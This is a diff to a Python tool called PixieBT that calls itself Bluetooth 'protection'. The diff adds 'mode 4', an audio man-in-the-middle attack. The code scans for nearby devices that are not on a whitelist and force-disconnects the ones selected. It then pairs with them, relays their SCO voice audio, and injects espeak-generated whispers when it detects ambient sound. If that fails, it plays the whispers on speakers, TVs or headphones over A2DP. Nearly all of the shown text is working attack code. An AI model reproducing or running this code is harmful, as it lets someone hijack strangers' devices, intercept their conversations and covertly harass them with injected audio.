@@ -6,10 +6,13 @@ import sys
 import re
 import json
 import time
+import wave
+import array
 import signal
 import shutil
 import struct
 import socket
+import tempfile
 import argparse
 import subprocess
 import configparser
@@ -32,6 +35,19 @@ banner_intro = """
 
 CONFIG_FILE = "pixiebt.conf"
 WHITELIST_FILE = "pixiebt_whitelist.json"
+WHISPERS_TEXT_FILE = "whispers.txt"
+
+# Audio constants for mode 4 (SCO CVSD: 8kHz, 16-bit, mono)
+AF_BLUETOOTH = getattr(socket, 'AF_BLUETOOTH', 31)
+BTPROTO_SCO = getattr(socket, 'BTPROTO_SCO', 2)
+SCO_SAMPLE_RATE = 8000
+SCO_SAMPLE_WIDTH = 2       # bytes per sample (16-bit)
+SCO_PKT_SIZE = 48          # typical SCO-HV3 payload size
+WHISPER_DETECT_WINDOW = 1600  # 200ms at 8kHz
+ENERGY_THRESHOLD = 500     # RMS floor (below = silence)
+ZCR_LOW = 0.05             # min zero-crossing rate
+ZCR_HIGH = 0.40            # max zero-crossing rate
+CV_THRESHOLD = 0.15        # energy coefficient of variation
 
 DESCRIPTION = """
 PixieBT - Bluetooth Device Monitoring & Protection
@@ -41,6 +57,7 @@ Modes:
   1 : Scan Bluetooth devices and select whitelist
   2 : Monitor + counter-offensive on unauthorized devices
   3 : Capture & replay — sniff non-whitelisted traffic and replay it
+  4 : Audio MITM — intercept + whisper injection (2 adapters required)
 ----------------------------------------------------------------------
 """
 
@@ -56,7 +73,8 @@ def load_config(config_path):
         sys.exit(1)
     config.read(config_path)
     iface = config.get("bluetooth", "interface", fallback="hci0")
-    return iface
+    whisper_lang = config.get("whisper", "lang", fallback=None)
+    return iface, whisper_lang
 
 
 def _get_controller_mac(iface):
@@ -1274,6 +1292,872 @@ def mode_replay(iface, include_ble=True, replay_count=10, capture_duration=1):
 
 
 # ──────────────────────────────────────────────
+#  Mode 4 : Audio MITM — Whisper Injection
+# ──────────────────────────────────────────────
+
+def _generate_whispers_from_text(text_file, output_dir=None, lang="en"):
+    """Generate whispered .wav files from a text file using espeak/espeak-ng.
+
+    Each non-empty line in the text file produces one WAV file.
+    Uses espeak's +whisper voice variant for a natural whispered sound.
+    Returns the output directory path containing the generated files.
+    """
+
+    if not os.path.isfile(text_file):
+        print(colored("[!] Text file not found: {}".format(text_file), "red"))
+        sys.exit(1)
+
+    # Find espeak binary
+    espeak_bin = None
+    for candidate in ["espeak-ng", "espeak"]:
+        if shutil.which(candidate):
+            espeak_bin = candidate
+            break
+    if not espeak_bin:
+        print(colored("[!] espeak / espeak-ng not found.", "red"))
+        print(colored("[!] Install with: sudo apt install espeak-ng", "red"))
+        sys.exit(1)
+
+    # Read words/phrases (one per line)
+    with open(text_file, "r", encoding="utf-8") as f:
+        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+    if not lines:
+        print(colored("[!] Text file is empty: {}".format(text_file), "red"))
+        sys.exit(1)
+
+    # Create output directory
+    if not output_dir:
+        output_dir = tempfile.mkdtemp(prefix="pixiebt_whispers_")
+    else:
+        os.makedirs(output_dir, exist_ok=True)
+
+    print(colored("[*] Generating {} whisper file(s) with {} ...".format(
+        len(lines), espeak_bin), "cyan"))
+
+    generated = 0
+    for i, phrase in enumerate(lines, 1):
+        # Sanitize filename: keep only alphanumeric, replace rest with _
+        safe = re.sub(r'[^a-zA-Z0-9]', '_', phrase)[:40].strip('_')
+        if not safe:
+            safe = "whisper_{}".format(i)
+        wav_path = os.path.join(output_dir, "{:03d}_{}.wav".format(i, safe))
+
+        # espeak -v <lang>+whisper -s <speed> -w <output> "<text>"
+        # Speed 130 = slightly slow for a creepy whisper effect
+        cmd = [
+            espeak_bin,
+            "-v", "{}+whisper".format(lang),
+            "-s", "130",
+            "-p", "35",   # lower pitch
+            "-w", wav_path,
+            phrase,
+        ]
+        try:
+            ret = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+            if ret.returncode == 0 and os.path.isfile(wav_path):
+                generated += 1
+                print(colored("    [+] {:03d} — {!r}".format(i, phrase), "green"))
+            else:
+                # Retry without +whisper variant (some espeak versions)
+                cmd[2] = lang
+                ret2 = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+                if ret2.returncode == 0 and os.path.isfile(wav_path):
+                    generated += 1
+                    print(colored("    [+] {:03d} — {!r} (no whisper voice)".format(i, phrase), "yellow"))
+                else:
+                    print(colored("    [!] {:03d} — {!r}: generation failed".format(i, phrase), "red"))
+        except Exception as e:
+            print(colored("    [!] {:03d} — {!r}: {}".format(i, phrase, e), "red"))
+
+    if generated == 0:
+        print(colored("[!] No WAV files could be generated.", "red"))
+        sys.exit(1)
+
+    print(colored("[+] Generated {} file(s) in {}".format(generated, output_dir), "green"))
+    return output_dir
+
+
+def mode_whisper(iface, iface2, whispers_dir, whisper_volume=0.15, include_ble=True,
+                 whispers_text=None, whisper_lang="en"):
+    """Intercept Bluetooth audio between two non-whitelisted devices
+    and inject whispered voices when multiple ambient sounds are detected.
+
+    Requires 2 Bluetooth adapters (iface + iface2).
+    Steps:
+      1. Load whisper .wav files
+      2. Discover non-whitelisted devices
+      3. User selects target pair (device A & device B)
+      4. Force-disconnect A from B
+      5. Pair & connect to A (adapter 1) and B (adapter 2) via SCO
+      6. Relay audio A↔B with whisper injection
+    """
+
+    whitelist = load_whitelist()
+    if not whitelist:
+        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
+        sys.exit(1)
+
+    wl_macs = {m.upper() for m in whitelist.keys()}
+    all_known = set(wl_macs)
+    for info in whitelist.values():
+        for peer_mac in info.get("allowed_peers", {}).keys():
+            all_known.add(peer_mac.upper())
+
+    if not iface2:
+        print(colored("[*] No -o: single-target injection mode only.", "yellow"))
+        print(colored("[*] For MITM relay (2 targets), use -o hci1.", "yellow"))
+
+    stop_event = threading.Event()
+
+    def _on_sigint(sig, frame):
+        print(colored("\n[*] Stopping ...", "yellow"))
+        stop_event.set()
+
+    signal.signal(signal.SIGINT, _on_sigint)
+
+    # ── Load whisper .wav files ──
+    def _load_whispers():
+        whispers = []
+        if not whispers_dir or not os.path.isdir(whispers_dir):
+            print(colored("[!] Whispers directory not found: {}".format(whispers_dir), "red"))
+            return whispers
+        for fname in sorted(os.listdir(whispers_dir)):
+            if not fname.lower().endswith('.wav'):
+                continue
+            fpath = os.path.join(whispers_dir, fname)
+            try:
+                with wave.open(fpath, 'rb') as wf:
+                    n_ch = wf.getnchannels()
+                    sw = wf.getsampwidth()
+                    rate = wf.getframerate()
+                    raw = wf.readframes(wf.getnframes())
+
+                # Convert to 16-bit signed
+                if sw == 1:
+                    samples = array.array('h', [(b - 128) * 256 for b in raw])
+                elif sw == 2:
+                    samples = array.array('h')
+                    samples.frombytes(raw)
+                elif sw == 4:
+                    vals = struct.unpack('<' + 'i' * (len(raw) // 4), raw)
+                    samples = array.array('h', [max(-32768, min(32767, v >> 16)) for v in vals])
+                else:
+                    continue
+
+                # Stereo → mono
+                if n_ch >= 2:
+                    samples = array.array('h', [
+                        (samples[i] + samples[i + 1]) // 2
+                        for i in range(0, len(samples) - 1, 2)
+                    ])
+
+                # Resample to SCO_SAMPLE_RATE (8kHz) if needed
+                if rate != SCO_SAMPLE_RATE:
+                    ratio = SCO_SAMPLE_RATE / rate
+                    new_len = max(1, int(len(samples) * ratio))
+                    resampled = array.array('h', [0] * new_len)
+                    for i in range(new_len):
+                        src = i / ratio
+                        idx = int(src)
+                        frac = src - idx
+                        if idx + 1 < len(samples):
+                            val = int(samples[idx] * (1 - frac) + samples[idx + 1] * frac)
+                        else:
+                            val = samples[min(idx, len(samples) - 1)]
+                        resampled[i] = max(-32768, min(32767, val))
+                    samples = resampled
+
+                whispers.append({"name": fname, "pcm": samples})
+                print(colored("    [+] {}: {} samples ({:.1f}s)".format(
+                    fname, len(samples), len(samples) / SCO_SAMPLE_RATE), "green"))
+            except Exception as e:
+                print(colored("    [!] {}: {}".format(fname, e), "yellow"))
+        return whispers
+
+    # ── Audio analysis ──
+    def _pcm_rms(samples):
+        """RMS energy of int16 PCM samples."""
+        if not samples:
+            return 0.0
+        return (sum(s * s for s in samples) / len(samples)) ** 0.5
+
+    def _pcm_zcr(samples):
+        """Zero-crossing rate."""
+        if len(samples) < 2:
+            return 0.0
+        return sum(
+            1 for i in range(1, len(samples))
+            if (samples[i] >= 0) != (samples[i - 1] >= 0)
+        ) / (len(samples) - 1)
+
+    def _detect_multi_source(buf):
+        """Detect multiple simultaneous ambient sound sources.
+        Uses 3 heuristics: energy floor, zero-crossing band, energy variance."""
+        if len(buf) < WHISPER_DETECT_WINDOW // 2:
+            return False
+        rms = _pcm_rms(buf)
+        if rms < ENERGY_THRESHOLD:
+            return False  # silence
+        zcr = _pcm_zcr(buf)
+        if zcr < ZCR_LOW or zcr > ZCR_HIGH:
+            return False  # pure tone or pure noise (single source)
+        # Energy variance across 4 sub-windows
+        cs = len(buf) // 4
+        energies = [_pcm_rms(buf[i * cs:(i + 1) * cs]) for i in range(4)]
+        mean_e = sum(energies) / 4
+        if mean_e < 1:
+            return False
+        var = sum((e - mean_e) ** 2 for e in energies) / 4
+        cv = (var ** 0.5) / mean_e  # coefficient of variation
+        return cv > CV_THRESHOLD
+
+    # ── Audio mixing ──
+    def _mix_pcm(original, whisper_pcm, w_pos, volume, n_samples):
+        """Mix whisper into original PCM. Returns (bytes, new_whisper_pos)."""
+        mixed = array.array('h', [0] * n_samples)
+        w_len = len(whisper_pcm)
+        for i in range(n_samples):
+            o = original[i] if i < len(original) else 0
+            w = int(whisper_pcm[(w_pos + i) % w_len] * volume)
+            mixed[i] = max(-32768, min(32767, o + w))
+        return mixed.tobytes(), (w_pos + n_samples) % w_len
+
+    # ── Bluetooth helpers ──
+    def _pair_device(target_mac):
+        """Pair with target using bluetoothctl (trust + pair)."""
+        print(colored("    [*] Pairing {} ...".format(target_mac), "white"))
+        try:
+            for cmd in ["trust", "pair"]:
+                subprocess.run(
+                    ["bluetoothctl", cmd, target_mac],
+                    capture_output=True, text=True, timeout=15,
+                    input="yes\n",
+                )
+            print(colored("    [+] Paired with {}".format(target_mac), "green"))
+            return True
+        except Exception as e:
+            print(colored("    [!] Pairing error: {}".format(e), "red"))
+            return False
+
+    def _disconnect_target(mac):
+        """Force disconnect a device."""
+        try:
+            subprocess.run(
+                ["bluetoothctl", "disconnect", mac],
+                capture_output=True, timeout=5,
+            )
+        except Exception:
+            pass
+
+    def _sco_connect(adapter_mac, target_mac):
+        """Open SCO socket to target. Returns socket or None."""
+        try:
+            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_SCO)
+            sock.bind((adapter_mac,))
+            sock.settimeout(10)
+            sock.connect((target_mac,))
+            sock.settimeout(1.0)
+            return sock
+        except OSError as e:
+            print(colored(
+                "    [!] SCO connection to {} failed: {}".format(target_mac, e), "red"))
+            print(colored(
+                "    [!] Make sure the device is paired and supports voice audio.", "red"))
+            return None
+
+    # ── Relay thread ──
+    def _relay_thread(src_sock, dst_sock, direction, whispers, stats):
+        """Relay SCO audio from src to dst with whisper injection."""
+        w_idx = 0
+        w_pos = 0
+        pcm_buf = array.array('h')
+
+        while not stop_event.is_set():
+            try:
+                data = src_sock.recv(SCO_PKT_SIZE * 2)
+                if not data:
+                    break
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+
+            n_samples = len(data) // SCO_SAMPLE_WIDTH
+            if n_samples == 0:
+                try:
+                    dst_sock.send(data)
+                except OSError:
+                    break
+                continue
+
+            # Decode to PCM samples
+            samples = array.array('h')
+            samples.frombytes(data[:n_samples * SCO_SAMPLE_WIDTH])
+
+            # Accumulate buffer for multi-source detection
+            pcm_buf.extend(samples)
+            if len(pcm_buf) > WHISPER_DETECT_WINDOW:
+                pcm_buf = pcm_buf[-WHISPER_DETECT_WINDOW:]
+
+            # Check for multi-source and inject if detected
+            inject = False
+            if whispers and len(pcm_buf) >= WHISPER_DETECT_WINDOW // 2:
+                if _detect_multi_source(pcm_buf):
+                    inject = True
+
+            if inject:
+                w = whispers[w_idx]
+                out_data, w_pos = _mix_pcm(
+                    samples, w["pcm"], w_pos, whisper_volume, n_samples)
+                stats["injections"] += 1
+                # Cycle through whisper files every 50 injections
+                if stats["injections"] % 50 == 0:
+                    w_idx = (w_idx + 1) % len(whispers)
+            else:
+                out_data = data
+
+            try:
+                dst_sock.send(out_data)
+            except OSError:
+                break
+            stats["relayed"] += 1
+
+        stats["stopped"] = True
+
+    # ── Inject thread (single-target) ──
+    def _inject_thread(sock, whispers, stats):
+        """Listen on SCO socket and inject whisper audio back into the same device."""
+        w_idx = 0
+        w_pos = 0
+        pcm_buf = array.array('h')
+
+        while not stop_event.is_set():
+            try:
+                data = sock.recv(SCO_PKT_SIZE * 2)
+                if not data:
+                    break
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+
+            n_samples = len(data) // SCO_SAMPLE_WIDTH
+            if n_samples == 0:
+                continue
+
+            # Decode incoming audio
+            samples = array.array('h')
+            samples.frombytes(data[:n_samples * SCO_SAMPLE_WIDTH])
+
+            # Accumulate buffer for detection
+            pcm_buf.extend(samples)
+            if len(pcm_buf) > WHISPER_DETECT_WINDOW:
+                pcm_buf = pcm_buf[-WHISPER_DETECT_WINDOW:]
+
+            # Detect multi-source and inject if triggered
+            inject = False
+            if whispers and len(pcm_buf) >= WHISPER_DETECT_WINDOW // 2:
+                if _detect_multi_source(pcm_buf):
+                    inject = True
+
+            if inject:
+                w = whispers[w_idx]
+                out_data, w_pos = _mix_pcm(
+                    samples, w["pcm"], w_pos, whisper_volume, n_samples)
+                stats["injections"] += 1
+                if stats["injections"] % 50 == 0:
+                    w_idx = (w_idx + 1) % len(whispers)
+            else:
+                out_data = data
+
+            try:
+                sock.send(out_data)
+            except OSError:
+                break
+            stats["relayed"] += 1
+
+        stats["stopped"] = True
+
+    # ── A2DP sink playback thread ──
+    def _a2dp_playback_thread(mac, whispers, stats):
+        """Play whisper WAVs to an A2DP sink (TV, speaker, headphones) via paplay/pw-play.
+        Plays whispers periodically with pauses between them."""
+        # Find PulseAudio/PipeWire sink for this device
+        sink_name = None
+        mac_part = mac.replace(":", "_")
+
+        # Detect audio system
+        play_cmd = None
+        for candidate in ["pw-play", "paplay", "aplay"]:
+            if shutil.which(candidate):
+                play_cmd = candidate
+                break
+
+        if not play_cmd:
+            print(colored("[!] No audio player found (pw-play/paplay/aplay).", "red"))
+            stats["stopped"] = True
+            return
+
+        # For PulseAudio/PipeWire: find the sink matching the BT MAC
+        if play_cmd in ("pw-play", "paplay"):
+            try:
+                ret = subprocess.run(
+                    ["pactl", "list", "short", "sinks"],
+                    capture_output=True, text=True, timeout=5,
+                )
+                for line in ret.stdout.strip().split("\n"):
+                    if mac_part in line:
+                        sink_name = line.split("\t")[1] if "\t" in line else line.split()[1]
+                        break
+            except Exception:
+                pass
+            if not sink_name:
+                # Also try PipeWire style
+                try:
+                    ret = subprocess.run(
+                        ["pactl", "list", "sinks"],
+                        capture_output=True, text=True, timeout=5,
+                    )
+                    for line in ret.stdout.strip().split("\n"):
+                        if mac_part in line or mac.replace(":", "-") in line:
+                            # Extract sink name from previous "Name:" line
+                            pass
+                    # Fallback: use bluez_sink.<mac>
+                    sink_name = "bluez_sink.{}".format(mac_part)
+                except Exception:
+                    sink_name = "bluez_sink.{}".format(mac_part)
+
+        print(colored("    [*] Audio player : {}".format(play_cmd), "cyan"))
+        if sink_name:
+            print(colored("    [*] Sink target  : {}".format(sink_name), "cyan"))
+
+        # Write whisper PCM to temporary WAV files for playback
+        tmp_wavs = []
+        tmp_dir = tempfile.mkdtemp(prefix="pixiebt_a2dp_")
+        for i, w in enumerate(whispers):
+            wav_path = os.path.join(tmp_dir, "{:03d}.wav".format(i))
+            try:
+                with wave.open(wav_path, 'wb') as wf:
+                    wf.setnchannels(1)
+                    wf.setsampwidth(SCO_SAMPLE_WIDTH)
+                    wf.setframerate(SCO_SAMPLE_RATE)
+                    wf.writeframes(w["pcm"].tobytes())
+                tmp_wavs.append(wav_path)
+            except Exception:
+                pass
+
+        if not tmp_wavs:
+            print(colored("[!] Cannot create temp WAV files.", "red"))
+            stats["stopped"] = True
+            return
+
+        w_idx = 0
+        while not stop_event.is_set():
+            wav_path = tmp_wavs[w_idx % len(tmp_wavs)]
+            cmd = [play_cmd]
+            if play_cmd == "paplay" and sink_name:
+                cmd.extend(["--device", sink_name])
+            elif play_cmd == "pw-play" and sink_name:
+                cmd.extend(["--target", sink_name])
+            cmd.append(wav_path)
+
+            try:
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                )
+                # Wait for playback to finish or stop signal
+                while proc.poll() is None and not stop_event.is_set():
+                    time.sleep(0.2)
+                if stop_event.is_set():
+                    proc.terminate()
+                    break
+                stats["injections"] += 1
+                w_idx += 1
+            except Exception as e:
+                print(colored("    [!] Playback error: {}".format(e), "red"))
+                break
+
+            # Pause between whispers (3-8 seconds, varies)
+            pause = 3.0 + (w_idx % 6)
+            for _ in range(int(pause * 5)):
+                if stop_event.is_set():
+                    break
+                time.sleep(0.2)
+
+        # Cleanup temp files
+        for f in tmp_wavs:
+            try:
+                os.unlink(f)
+            except Exception:
+                pass
+        try:
+            os.rmdir(tmp_dir)
+        except Exception:
+            pass
+        stats["stopped"] = True
+
+    # ── A2DP connect helper ──
+    def _a2dp_connect(mac):
+        """Connect to a device via A2DP profile using bluetoothctl.
+        Returns True if the device appears as an audio sink."""
+        try:
+            subprocess.run(
+                ["bluetoothctl", "connect", mac],
+                capture_output=True, text=True, timeout=15,
+                input="yes\n",
+            )
+            time.sleep(2)
+            # Check if a PulseAudio/PipeWire sink appeared
+            mac_part = mac.replace(":", "_")
+            ret = subprocess.run(
+                ["pactl", "list", "short", "sinks"],
+                capture_output=True, text=True, timeout=5,
+            )
+            for line in ret.stdout.strip().split("\n"):
+                if mac_part in line or mac.replace(":", "-") in line:
+                    return True
+            # Even if not found in pactl, the connection may work
+            return True
+        except Exception:
+            return False
+
+    # ═══════════════════════════════════════════
+    #  MAIN FLOW
+    # ═══════════════════════════════════════════
+
+    print(colored("[+] Mode 4 — Audio MITM: Whisper Injection", "cyan", attrs=["bold"]))
+    print(colored("[*] Adapter 1    : {}".format(iface), "cyan"))
+    print(colored("[*] Adapter 2    : {}".format(iface2), "cyan"))
+    print(colored("[*] Whisper vol  : {:.0%}".format(whisper_volume), "cyan"))
+    print()
+
+    # Step 0: Generate WAV from text file (auto-fallback to default)
+    if not whispers_text and not whispers_dir:
+        # No explicit source — use default text file
+        whispers_text = WHISPERS_TEXT_FILE
+        print(colored("[*] No --whispers-dir or -f specified", "yellow"))
+        print(colored("[*] Using default: {}".format(WHISPERS_TEXT_FILE), "yellow"))
+    if whispers_text:
+        whispers_dir = _generate_whispers_from_text(whispers_text, whispers_dir, lang=whisper_lang)
+        print()
+
+    print(colored("[*] Whispers dir : {}".format(whispers_dir), "cyan"))
+    print()
+
+    # Step 1: Load whispers
+    print(colored("[*] Loading whisper files ...", "cyan"))
+    whispers = _load_whispers()
+    if not whispers:
+        print(colored("[!] No .wav files found in {}".format(whispers_dir), "red"))
+        if not whispers_text:
+            print(colored("[*] Tip: use -f words.txt to generate from text", "yellow"))
+        sys.exit(1)
+    print(colored("[+] Loaded {} whisper file(s)\n".format(len(whispers)), "green"))
+
+    # Step 2: Discover non-whitelisted devices
+    has_hcitool = shutil.which("hcitool") is not None
+    print(colored("[*] Scanning for non-whitelisted devices ...", "cyan"))
+    targets = {}
+    if has_hcitool:
+        try:
+            ret = subprocess.run(
+                ["hcitool", "-i", iface, "scan", "--flush", "--length", "6"],
+                capture_output=True, text=True, timeout=20,
+            )
+            for line in ret.stdout.strip().split("\n"):
+                m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
+                if m:
+                    mac = m.group(1).upper()
+                    name = m.group(2).strip() or "<unknown>"
+                    if mac not in all_known:
+                        targets[mac] = {"name": name, "type": "classic"}
+        except Exception:
+            pass
+        if include_ble:
+            try:
+                proc = subprocess.Popen(
+                    ["hcitool", "-i", iface, "lescan", "--duplicates"],
+                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
+                )
+                time.sleep(8)
+                proc.terminate()
+                try:
+                    rem, _ = proc.communicate(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    proc.wait()
+                    rem = ""
+                for line in (rem or "").strip().split("\n"):
+                    m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
+                    if m:
+                        mac = m.group(1).upper()
+                        name = m.group(2).strip()
+                        if name in ("(unknown)", ""):
+                            name = "<unknown>"
+                        if mac not in all_known and mac not in targets:
+                            targets[mac] = {"name": name, "type": "ble"}
+            except Exception:
+                pass
+    else:
+        devs = _btctl_scan(10)
+        for mac, info in devs.items():
+            if mac not in all_known:
+                targets[mac] = info
+
+    if len(targets) < 1:
+        print(colored("[!] No non-whitelisted devices found.", "red"))
+        sys.exit(1)
+
+    # Step 3: User selects target(s)
+    sorted_targets = sorted(targets.items())
+    print(colored("\n  Non-whitelisted devices:", "yellow", attrs=["bold"]))
+    print("   #   MAC                 NAME                         TYPE")
+    print("   " + "-" * 63)
+    for i, (mac, info) in enumerate(sorted_targets, 1):
+        print("   {}   {}   {:28s} {}".format(i, mac, info["name"], info["type"]))
+
+    dual_mode = iface2 is not None
+
+    if dual_mode:
+        print(colored("\n  [1 target]  Direct injection (whisper sent to device)", "cyan"))
+        print(colored("  [2 targets] MITM relay (intercept audio between A ↔ B)", "cyan"))
+        print()
+        try:
+            sel = input(colored("[?] Select target(s) — comma-separated (e.g. 1 or 1,2): ", "cyan")).strip()
+            indices = [int(x.strip()) - 1 for x in sel.split(",")]
+        except (ValueError, EOFError):
+            print(colored("[!] Invalid selection.", "red"))
+            sys.exit(1)
+    else:
+        # Single adapter → single target only
+        print()
+        try:
+            sel = input(colored("[?] Select target (number): ", "cyan")).strip()
+            indices = [int(sel) - 1]
+        except (ValueError, EOFError):
+            print(colored("[!] Invalid selection.", "red"))
+            sys.exit(1)
+
+    for idx in indices:
+        if not (0 <= idx < len(sorted_targets)):
+            print(colored("[!] Invalid selection: {}".format(idx + 1), "red"))
+            sys.exit(1)
+    if len(indices) == 2 and indices[0] == indices[1]:
+        print(colored("[!] Device A and B must be different.", "red"))
+        sys.exit(1)
+    if len(indices) > 2:
+        print(colored("[!] Select 1 or 2 targets maximum.", "red"))
+        sys.exit(1)
+
+    # ─── Single-target mode ────────────────────
+    if len(indices) == 1:
+        mac_t, info_t = sorted_targets[indices[0]]
+        print(colored("\n[*] Target: {} ({})".format(mac_t, info_t["name"]), "yellow"))
+
+        adapter_mac = _get_controller_mac(iface)
+        if not adapter_mac:
+            print(colored("[!] Cannot read adapter MAC from sysfs.", "red"))
+            sys.exit(1)
+
+        print(colored("\n[*] Disconnecting target ...", "cyan"))
+        _disconnect_target(mac_t)
+        time.sleep(1)
+
+        print(colored("[*] Pairing with target ...", "cyan"))
+        if not _pair_device(mac_t):
+            print(colored("[!] Cannot pair. Aborting.", "red"))
+            sys.exit(1)
+        time.sleep(1)
+
+        # Try SCO first (voice devices), fallback to A2DP (TV, speakers, headphones)
+        use_a2dp = False
+        print(colored("[*] Trying SCO connection (voice profile) ...", "cyan"))
+        sock_t = _sco_connect(adapter_mac, mac_t)
+
+        if sock_t:
+            print(colored("    [+] SCO → {} ({})".format(mac_t, info_t["name"]), "green"))
+            print(colored("[*] Mode  : SCO direct injection", "yellow"))
+            print(colored(
+                "\n[+] Direct injection active — whispers sent on multi-source detection",
+                "green", attrs=["bold"]))
+            print(colored("[*] Press Ctrl+C to stop\n", "cyan"))
+
+            stats_inj = {"relayed": 0, "injections": 0, "stopped": False}
+            t_inj = threading.Thread(
+                target=_inject_thread,
+                args=(sock_t, whispers, stats_inj),
+                daemon=True,
+            )
+            t_inj.start()
+
+            while not stop_event.is_set():
+                time.sleep(10)
+                if stop_event.is_set():
+                    break
+                color = "green" if stats_inj["injections"] == 0 else "magenta"
+                print(colored(
+                    "[*] Packets: {} | Injections: {}".format(
+                        stats_inj["relayed"], stats_inj["injections"]),
+                    color))
+                if stats_inj["stopped"]:
+                    print(colored("[!] Injection thread stopped.", "red"))
+                    break
+
+            stop_event.set()
+            sock_t.close()
+            t_inj.join(timeout=5)
+            print(colored("[*] PixieBT mode 4 stopped.", "yellow"))
+            print(colored("[*] Total: {} pkt(s), {} whisper injection(s)".format(
+                stats_inj["relayed"], stats_inj["injections"]), "cyan"))
+        else:
+            # SCO failed → A2DP fallback (TV, speakers, headphones)
+            print(colored(
+                "[*] SCO not available — switching to A2DP sink mode (TV/speaker/headphones)",
+                "yellow"))
+            print(colored("[*] Connecting via A2DP ...", "cyan"))
+
+            if not _a2dp_connect(mac_t):
+                print(colored("[!] A2DP connection failed.", "red"))
+                sys.exit(1)
+            print(colored("    [+] A2DP → {} ({})".format(mac_t, info_t["name"]), "green"))
+            print(colored("[*] Mode  : A2DP playback (whispers played on device)", "yellow"))
+            print(colored(
+                "\n[+] A2DP injection active — whispers played directly on target",
+                "green", attrs=["bold"]))
+            print(colored("[*] Press Ctrl+C to stop\n", "cyan"))
+
+            stats_inj = {"relayed": 0, "injections": 0, "stopped": False}
+            t_play = threading.Thread(
+                target=_a2dp_playback_thread,
+                args=(mac_t, whispers, stats_inj),
+                daemon=True,
+            )
+            t_play.start()
+
+            while not stop_event.is_set():
+                time.sleep(10)
+                if stop_event.is_set():
+                    break
+                color = "green" if stats_inj["injections"] == 0 else "magenta"
+                print(colored(
+                    "[*] Whispers played: {}".format(stats_inj["injections"]),
+                    color))
+                if stats_inj["stopped"]:
+                    print(colored("[!] Playback thread stopped.", "red"))
+                    break
+
+            stop_event.set()
+            _disconnect_target(mac_t)
+            t_play.join(timeout=5)
+            print(colored("[*] PixieBT mode 4 stopped.", "yellow"))
+            print(colored("[*] Total: {} whisper(s) played on {}".format(
+                stats_inj["injections"], info_t["name"]), "cyan"))
+
+        return
+
+    # ─── Dual-target MITM mode ─────────────────
+    if not iface2:
+        print(colored("[!] MITM relay requires -o.", "red"))
+        sys.exit(1)
+    check_interface(iface2)
+
+    mac_a, info_a = sorted_targets[indices[0]]
+    mac_b, info_b = sorted_targets[indices[1]]
+
+    print(colored("\n[*] Target A: {} ({})".format(mac_a, info_a["name"]), "yellow"))
+    print(colored("[*] Target B: {} ({})".format(mac_b, info_b["name"]), "yellow"))
+    print(colored("[*] Mode    : MITM relay", "yellow"))
+
+    # Step 4: Get adapter MACs
+    adapter1_mac = _get_controller_mac(iface)
+    adapter2_mac = _get_controller_mac(iface2)
+    if not adapter1_mac or not adapter2_mac:
+        print(colored("[!] Cannot read adapter MAC addresses from sysfs.", "red"))
+        sys.exit(1)
+
+    # Step 5: Disconnect targets from each other
+    print(colored("\n[*] Disconnecting targets ...", "cyan"))
+    _disconnect_target(mac_a)
+    _disconnect_target(mac_b)
+    time.sleep(1)
+
+    # Step 6: Pair with both targets
+    print(colored("[*] Pairing with targets ...", "cyan"))
+    if not _pair_device(mac_a):
+        print(colored("[!] Cannot pair with device A. Aborting.", "red"))
+        sys.exit(1)
+    if not _pair_device(mac_b):
+        print(colored("[!] Cannot pair with device B. Aborting.", "red"))
+        sys.exit(1)
+    time.sleep(1)
+
+    # Step 7: Establish SCO connections
+    print(colored("[*] Establishing SCO connections ...", "cyan"))
+    sock_a = _sco_connect(adapter1_mac, mac_a)
+    if not sock_a:
+        sys.exit(1)
+    print(colored("    [+] SCO → A: {} ({})".format(mac_a, info_a["name"]), "green"))
+
+    sock_b = _sco_connect(adapter2_mac, mac_b)
+    if not sock_b:
+        sock_a.close()
+        sys.exit(1)
+    print(colored("    [+] SCO → B: {} ({})".format(mac_b, info_b["name"]), "green"))
+
+    # Step 8: Start relay threads
+    print(colored(
+        "\n[+] MITM relay active — whispers injected on multi-source detection",
+        "green", attrs=["bold"]))
+    print(colored("[*] Press Ctrl+C to stop\n", "cyan"))
+
+    stats_a2b = {"relayed": 0, "injections": 0, "stopped": False}
+    stats_b2a = {"relayed": 0, "injections": 0, "stopped": False}
+
+    t_a2b = threading.Thread(
+        target=_relay_thread,
+        args=(sock_a, sock_b, "A→B", whispers, stats_a2b),
+        daemon=True,
+    )
+    t_b2a = threading.Thread(
+        target=_relay_thread,
+        args=(sock_b, sock_a, "B→A", whispers, stats_b2a),
+        daemon=True,
+    )
+    t_a2b.start()
+    t_b2a.start()
+
+    # Step 9: Summary loop
+    while not stop_event.is_set():
+        time.sleep(10)
+        if stop_event.is_set():
+            break
+        total_r = stats_a2b["relayed"] + stats_b2a["relayed"]
+        total_i = stats_a2b["injections"] + stats_b2a["injections"]
+        color = "green" if total_i == 0 else "magenta"
+        print(colored(
+            "[*] Relay: {} pkt(s) | Injections: {} | A→B: {}/{} | B→A: {}/{}".format(
+                total_r, total_i,
+                stats_a2b["relayed"], stats_a2b["injections"],
+                stats_b2a["relayed"], stats_b2a["injections"]),
+            color))
+        if stats_a2b["stopped"] and stats_b2a["stopped"]:
+            print(colored("[!] Both relay threads stopped.", "red"))
+            break
+
+    # Step 10: Cleanup
+    stop_event.set()
+    sock_a.close()
+    sock_b.close()
+    t_a2b.join(timeout=5)
+    t_b2a.join(timeout=5)
+    total_r = stats_a2b["relayed"] + stats_b2a["relayed"]
+    total_i = stats_a2b["injections"] + stats_b2a["injections"]
+    print(colored("[*] PixieBT mode 4 stopped.", "yellow"))
+    print(colored("[*] Total: {} pkt(s) relayed, {} whisper injection(s)".format(
+        total_r, total_i), "cyan"))
+
+
+# ──────────────────────────────────────────────
 #  Main
 # ──────────────────────────────────────────────
 
@@ -1286,8 +2170,8 @@ if __name__ == "__main__":
     parser.add_argument(
         "-m", "--mode",
